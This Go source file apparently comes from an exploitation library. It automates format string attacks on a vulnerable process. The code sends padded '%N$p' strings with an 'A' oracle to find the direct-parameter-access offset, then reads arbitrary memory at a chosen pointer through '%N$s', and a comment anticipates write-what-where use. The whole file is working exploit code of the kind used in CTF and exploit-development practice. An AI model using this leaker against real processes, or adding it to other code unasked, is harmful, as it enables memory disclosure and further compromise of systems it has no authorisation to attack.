package memory

import (
	"bytes"
	"fmt"
	"log"
	"strconv"
	"strings"
)

type ProcessIO interface {
	WriteLine(p []byte) error
	ReadUntil(p []byte) ([]byte, error)
}

type FormatStringDPAConfig struct {
	ProcessIOFn  func() ProcessIO
	MaxNumParams int
	PointerSize  int
	Verbose      *log.Logger
}

func (o FormatStringDPAConfig) validate() error {
	if o.ProcessIOFn == nil {
		return fmt.Errorf("get process function cannot be nil")
	}

	if o.MaxNumParams <= 0 {
		return fmt.Errorf("maximum number of format function parameters must be greater than 0")
	}

	if o.PointerSize <= 0 {
		return fmt.Errorf("pointer size in bytes must be greater than 0")
	}

	return nil
}

func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStringLeaker {
	f, err := SetupFormatStringLeakViaDPA(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create format string param leaker - %w", err))
	}
	return f
}

func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
	formatString, err := createDPAFormatStringLeakWithLastValueAsArg(config)
	if err != nil {
		return nil, err
	}

	formatString.info.specifierChar = 's'
	unpaddedStr := formatString.withoutPadding()
	finalPaddedFormatStr := prependStringWithCharUntilLen(
		unpaddedStr,
		'A',
		stackAlignedLen(unpaddedStr, config.PointerSize))

	return &FormatStringLeaker{
		procIOFn:  config.ProcessIOFn,
		formatStr: finalPaddedFormatStr,
		info:      formatString.info,
	}, nil
}

// In the future, this could be used to setup a write-what-where format
// string. This function was created by accident (it could have remained
// a part of the original function).
func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (*dpaFormatString, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	formatString := dpaFormatString{
		paramNumber: 0,
		info:        formatStringInfo{
			leakedDataSep:    []byte("|"),
			specifierChar:    'p',
			endOfStringDelim: []byte("foozlefu"),
		},
	}

	// The resulting string is going to look like this:
	//     [padding][format-string-with-loop-index][address]
	//
	// The "padding" is required because of the format
	// string parameter specifier. As it grows, it could
	// potentially mess up the alignment of the stack,
	// which will make finding the oracle very difficult.
	//
	// Set to max for str len calculation.
	formatString.paramNumber = config.MaxNumParams
	fmtStringStackAlignedLen := stackAlignedLen(
		formatString.withoutPadding(),
		config.PointerSize)

	if config.Verbose != nil {
		config.Verbose.Printf("format string config: %+v\nlen: %d\nstring w/o padding: '%s'",
			formatString, fmtStringStackAlignedLen, formatString.withoutPadding())
	}

	// TODO: Randomize oracle string instead of A's.
	oracle := strings.Repeat("A", config.PointerSize)
	// TODO: Some platforms do not include '0x' in the format
	//  function's output.
	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))

	i := 0
	for ; i < config.MaxNumParams; i++ {
		formatString.paramNumber = i

		addressFromFormatFunc, err := leakDataWithFormatString(
			config.ProcessIOFn(),
			append(formatString.paddedTo(fmtStringStackAlignedLen), oracle...),
			formatString.info)
		if err != nil {
			return nil, err
		}

		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
			return &formatString, nil
		}
	}

	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
}

type dpaFormatString struct {
	info        formatStringInfo
	paramNumber int
}

type formatStringInfo struct {
	leakedDataSep    []byte
	specifierChar    byte
	endOfStringDelim []byte
}

func (o dpaFormatString) paddedTo(finalStrLen int) []byte {
	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
}

func (o dpaFormatString) withoutPadding() []byte {
	buff := bytes.NewBuffer(nil)
	buff.Write(o.info.leakedDataSep)
	buff.WriteString("%")
	buff.WriteString(strconv.Itoa(o.paramNumber))
	buff.WriteString("$")
	buff.WriteByte(o.info.specifierChar)
	buff.Write(o.info.leakedDataSep)
	buff.Write(o.info.endOfStringDelim)
	return buff.Bytes()
}

type FormatStringLeaker struct {
	formatStr []byte
	info      formatStringInfo
	procIOFn  func() ProcessIO
}

func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
	p, err := o.MemoryAt(pointer)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to read memory at 0x%x - %w", pointer, err))
	}
	return p
}

func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.info)
}

func NewFormatStringDPALeakerOrExit(config FormatStringDPAConfig) *FormatStringDPALeaker {
	res, err := NewFormatStringDPALeaker(config)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to create new format string direct parameter access number leaker - %w", err))
	}
	return res
}

func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALeaker, error) {
	err := config.validate()
	if err != nil {
		return nil, err
	}

	formatString := dpaFormatString{
		info:        formatStringInfo{
			leakedDataSep:    []byte("|"),
			specifierChar:    'p',
			endOfStringDelim: []byte("foozlefu"),
		},
		paramNumber: config.MaxNumParams,
	}

	// Get the maximum length of the format string, and
	// calculate the number of bytes required to keep
	// it aligned on the stack.
	paddedLen := stackAlignedLen(formatString.withoutPadding(), config.PointerSize)
	formatString.paramNumber = 0

	return &FormatStringDPALeaker{
		config:    config,
		paddedLen: paddedLen,
		dpaSting:  formatString,
	}, nil
}

type FormatStringDPALeaker struct {
	config    FormatStringDPAConfig
	paddedLen int
	dpaSting  dpaFormatString
}

func (o FormatStringDPALeaker) FindParamNumberOrExit(target []byte) (int, bool) {
	i, b, err := o.FindParamNumber(target)
	if err != nil {
		defaultExitFn(err)
	}
	return i, b
}

func (o FormatStringDPALeaker) FindParamNumber(target []byte) (int, bool, error) {
	for i := 0; i < o.config.MaxNumParams; i++ {
		result, err := o.MemoryAtParam(i)
		if err != nil {
			return 0, false, fmt.Errorf("failed to get memory at direct access param number %d - %w",
				i, err)
		}

		if o.config.Verbose != nil {
			o.config.Verbose.Printf("FindParamNumber read: '%s'", result)
		}

		if bytes.Equal(target, result) {
			if o.config.Verbose != nil {
				o.config.Verbose.Printf("FindParamNumber found target: '%s'", target)
			}
			return i, true, nil
		}
	}

	return 0, false, nil
}

func (o FormatStringDPALeaker) MemoryAtParamOrExit(paramNumber int) []byte {
	res, err := o.MemoryAtParam(paramNumber)
	if err != nil {
		defaultExitFn(fmt.Errorf("failed to get memory at param number %d - %w", paramNumber, err))
	}
	return res
}

func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
	if paramNumber > o.config.MaxNumParams {
		// This is a problem because it may potentially shift
		// the arguments on the stack, and make the result
		// of the format string function unpredictable.
		return nil, fmt.Errorf("requested parameter number %d exceeds maximum params of %d",
			paramNumber, o.config.MaxNumParams)
	}

	o.dpaSting.paramNumber = paramNumber
	strWithoutPadding := o.dpaSting.withoutPadding()

	stackAlignedStr := prependStringWithCharUntilLen(
		strWithoutPadding,
		'A',
		o.paddedLen)

	return leakDataWithFormatString(o.config.ProcessIOFn(), stackAlignedStr, o.dpaSting.info)
}

func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringInfo) ([]byte, error) {
	err := process.WriteLine(formatStr)
	if err != nil {
		return nil, fmt.Errorf("failed to write format string to process - %w", err)
	}

	token, err := process.ReadUntil(info.endOfStringDelim)
	if err != nil {
		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
	}

	firstSepIndex := bytes.Index(token, info.leakedDataSep)
	if firstSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
	}

	lineWithoutFirstSep := token[firstSepIndex+1:]
	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.leakedDataSep)
	if lastSepIndex == -1 {
		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
	}

	return lineWithoutFirstSep[0:lastSepIndex], nil
}

func stackAlignedLen(stringWithoutPadding []byte, pointerSizeBytes int) int {
	maxStringLen := len(stringWithoutPadding)
	padLen := 0
	for {
		if (maxStringLen + padLen) % pointerSizeBytes == 0 {
			break
		}
		padLen++
	}
	return padLen + maxStringLen
}

func prependStringWithCharUntilLen(str []byte, c byte, newLen int) []byte {
	strLen := len(str)
	if strLen >= newLen {
		return str
	}

	return append(bytes.Repeat([]byte{c}, newLen-strLen), str...)
}
